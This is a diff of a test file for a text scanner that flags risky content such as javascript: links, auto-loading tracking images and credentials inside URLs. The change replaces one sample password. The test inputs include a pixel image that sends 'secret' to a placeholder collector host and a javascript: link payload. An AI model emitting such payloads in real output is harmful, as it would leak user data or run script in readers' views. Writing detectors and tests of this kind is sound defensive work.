@@ -18,7 +18,7 @@ test("closed sets: the platform's own tool names and paths, and links that act b
   assert.equal(closedSetFindings("[x](javascript:alert(1))")[0].code, "unsafe_link_scheme");
   assert.equal(closedSetFindings("![pixel](https://collector.example/p?q=secret)")[0].code, "auto_loading_image");
   assert.equal(closedSetFindings('<img src="https://x.example/a.png">')[0].code, "auto_loading_image");
-  assert.equal(closedSetFindings("Fetch https://admin:hunter2@internal.example/ first")[0].code, "credential_in_link");
+  assert.equal(closedSetFindings("Fetch https://admin:test-only-password@internal.example/ first")[0].code, "credential_in_link");
 });
 
 test("a model flag stands only on words the entry contains; the pack is not held when the model is down", async () => {
